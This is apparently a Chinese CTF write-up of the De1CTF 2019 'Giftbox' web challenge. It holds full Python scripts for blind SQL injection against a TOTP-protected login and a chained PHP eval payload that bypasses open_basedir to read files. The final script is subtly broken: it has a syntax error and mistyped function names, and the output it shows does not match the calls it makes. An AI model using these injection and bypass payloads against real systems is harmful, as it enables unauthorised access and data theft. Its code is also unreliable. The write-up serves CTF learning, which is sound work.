---
title: buuoj刷题记录8
date: 2020-01-12 12:57:41
tags:
 - wbe
 - De1CTF
 - sql注入
 - 命令执行
categories: 
 - 刷题记录
---

## [De1CTF 2019]Giftbox

### 0x00 基础

totp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。

SQL盲注

open_basedir绕过

<!--more-->



### 0x01 分析

打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md

```
login [username] [password]
logout
launch
targeting [code] [position]
destruct 
```

fuzz后发现要登入，登入抓包的时候发现有一个totp参数

```
GET /shell.php?a=login%20admin%20admin&totp=59858608 HTTP/1.1
Host: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn/
Cookie: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt
```

进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入

```
[de1ta@de1ta-mbp /sandbox]% login admin' admin
login fail, user not found.
[de1ta@de1ta-mbp /sandbox]% login admin'# admin
login fail, password incorrect.
[de1ta@de1ta-mbp /sandbox]% targeting
login first.
[de1ta@de1ta-mbp /sandbox]% launch
login first.
```

查看源码，再main.js发现了数据提交过程，和服务器totp设置

```
···
/*
[Developer Notes]
OTP Library for Python located in js/pyotp.zip
Server Params:
digits = 8
interval = 5
window = 1
*/
···
···
$.ajax({
        url: host + '/shell.php?a='+encodeURIComponent(input)+'&totp=' + new TOTP("GAXG24JTMZXGKZBU",8).genOTP(),
        type: "GET",
        dataType: 'json',
        success: (res) => {
            e_main.html($('#main').html() + '[<span id="usr">' + usrName + '</span>@<span class="host">de1ta-mbp</span> ' + position + ']% ' + input + '<br/>' + res.message + '<br/>')
            if (e_console.height()-$(window).height()>0){e_console.css('top',-(e_console.height()-$(window).height()));}else{e_console.css('top',5);}
        },
        error: (res) => {
            e_main.html($('#main').html() + '[<span id="usr">' + usrName + '</span>@<span class="host">de1ta-mbp</span> ' + position + ']% ' + input + '<br/>System Fatal Error!<br/>')
            if (e_console.height()-$(window).height()>0){e_console.css('top',-(e_console.height()-$(window).height()));}else{e_console.css('top',5);}
        }
      })
···
```

### 0x02 操作

编写盲注脚本

```
# -*- coding: utf-8 -*-
# @Time    : 1/14/2020 9:42 PM
import pyotp
import requests
import time

def get(url, payload):
    time.sleep(0.5)
    totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)
    params = {
        'a': "login admin'/**/and/**/("+payload+")# admin",
        'totp': totp.now()
    }
    # print(params)
    html = requests.get(url,params=params,).text
    # print(html)
    return html




def binsea(s_payload,len=64):
    result = ''
    for x in range(1, len+1):
        left = 0
        right = 126
        while left <= right:
            mid = (left + right) / 2
            payload = "ascii(substr((%s),%d,1))>%d" % (s_payload,x, mid)
            url = 'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'
            html = get(url, payload)
            # print(html, '*-*-*-*-*-*', mid)
            if 'password' in html:
                left = mid +1
            else:
                right = mid -1
        mid = int((left + right + 1) / 2)
        result += chr(mid)
        print(result)
    return result

def get_database():
    s_payload='database()'
    database = binsea(s_payload,7)
    print(database)



def get_tabls():
    s_payload = 'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\'giftbox\''
    tables=binsea(s_payload,5)

def get_columns():
    s_payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\'users\''
    columns=binsea(s_payload)


def get_data():
    s_payload='select/**/concat(password)/**/from/**/users'
    password=binsea(s_payload)

if __name__ == '__main__':
    # get_database()
    # get_tabls()
    # get_columns()
    # get_data()
```

数据库是giftbox,只有一个users表，有`id,username,password`

admin的密码是`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`

根据密码的提示得到

```
[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333
we add an evil monster named 'eval' when launching missiles.
```

targeting  还有长度限制，code为2，possition为12。

在phpiofo中设置了open_basedir

![](../pic/37.png)

关于open_basedir
   open_basedir是php.ini中的一个配置选项
   它可将用户访问文件的活动范围限制在指定的区域，
   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。
   注意用open_basedir指定的限制实际上是前缀,而不是目录名。
   举例来说: 若"open_basedir = /dir/user", 那么目录 "/dir/user" 和 "/dir/user1"都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。

[绕过参考文章](https://www.cnblogs.com/cimuhuashuimu/p/11544487.html)

绕过payload

```
chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));`
```

附上完整脚本

```
# -*- coding: utf-8 -*-
# @Time    : 1/14/2020 9:42 PM
import pyotp
import requests
import time

sesssion=requests.session()
url = 'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'
totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)

def get(url, payload):
    time.sleep(0.5)
    params = {
        'a': "login admin'/**/and/**/("+payload+")# admin",
        'totp': totp.now()
    }
    # print(params)
    html = requests.get(url,params=params,).text
    # print(html)
    return html




def binsea(s_payload,len=64):
    result = ''
    for x in range(1, len+1):
        left = 0
        right = 126
        while left <= right:
            mid = (left + right) / 2
            payload = "ascii(substr((%s),%d,1))>%d" % (s_payload,x, mid)

            html = get(url, payload)
            # print(html, '*-*-*-*-*-*', mid)
            if 'password' in html:
                left = mid +1
            else:
                right = mid -1
        mid = int((left + right + 1) / 2)
        result += chr(mid)
        print(result)
    return result

def get_database():
    s_payload='database()'
    database = binsea(s_payload,7)
    print(database)



def get_tabls():
    s_payload = 'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\'giftbox\''
    tables=binsea(s_payload,5)

def get_columns():
    s_payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\'users\''
    columns=binsea(s_payload,23)


def get_data():
    s_payload='select/**/concat(password)/**/from/**/users'
    password=binsea(s_payload,13)


def login():
    params = {
        'a': "login admin hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}",
        'totp': totp.now()
    }
    sesssion.get(url, params=params)

def target(code,position):

    params = {
        'a': "targeting"+code+' '+position,
        'totp': totp.now()
    }
    sesssion.get(url,params=params)

def destruct():
    params = {
        'a': "destruct",
        'totp': totp.now()
    }
    sesssion.get(url, params=params)

def launch():
    params = {
        'a': 'launch',
        'totp': totp.now()
    }
    print(sesssion.get(url, params=params).json())



def get_password():
    # get_database()
    # get_tabls()
    # get_columns()
    get_data()
    
def get_flag():
    login()
    target('a','chdir')
    target('b','img')
    target('c','{$a($b)}')

    target('d','ini_set')
    target('e', 'open_base_dir')
    target('f', '..')
    target('g', '{$d($e,$f)}')

    target('h', '{$a($f)}')

    target('i', '{$a($f)}')

    target('j', '{$a($f)}')

    target('k','{$a($f)}' )

    target('l', '/')
    target('m', '{$d($e,$l)}')

    target('n', 'eaho')
    target('o', 'file_get_')
    target('p', 'contents')
    target('q', '$o$p')
    target('r', 'flag')
    target('s','{$n($q(r))}' )
    launch()


if __name__ == '__main__':
	get_flag():
```

返回结果

```
{'code': 0, 'message': 'Initializing launching system...<br>Setting target: $a = "chdir";<br>Reading target: $a = "chdir";<br>Setting target: $b = "img";<br>Reading target: $b = "img";<br>Setting target: $c = "{$a($b)}";<br>Reading target: $c = "1";<br>Setting target: $d = "ini_set";<br>Reading target: $d = "ini_set";<br>Setting target: $e = "open_basedir";<br>Reading target: $e = "open_basedir";<br>Setting target: $f = "..";<br>Reading target: $f = "..";<br>Setting target: $g = "{$d($e,$f)}";<br>Reading target: $g = "/app:/sandbox";<br>Setting target: $h = "{$a($f)}";<br>Reading target: $h = "1";<br>Setting target: $i = "{$a($f)}";<br>Reading target: $i = "1";<br>Setting target: $j = "Ly8v";<br>Reading target: $j = "Ly8v";<br>Setting target: $k = "base64_";<br>Reading target: $k = "base64_";<br>Setting target: $l = "decode";<br>Reading target: $l = "decode";<br>Setting target: $m = "$k$l";<br>Reading target: $m = "base64_decode";<br>Setting target: $n = "{$m($j)}";<br>Reading target: $n = "///";<br>Setting target: $o = "{$d($e,$n)}";<br>Reading target: $o = "..";<br>Setting target: $p = "flag";<br>Reading target: $p = "flag";<br>Setting target: $q = "file_get";<br>Reading target: $q = "file_get";<br>Setting target: $r = "_contents";<br>Reading target: $r = "_contents";<br>Setting target: $s = "$q$r";<br>Reading target: $s = "file_get_contents";<br>Setting target: $t = "{$s($p)}";<br>Reading target: $t = "flag{dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3}\n";<br>3..2..1..Fire!<br>All 20 missiles are launched...<br>Cruising...<br>Engaging...Bull\'s-eye!<br>All targets are eliminated.<br>'}
```



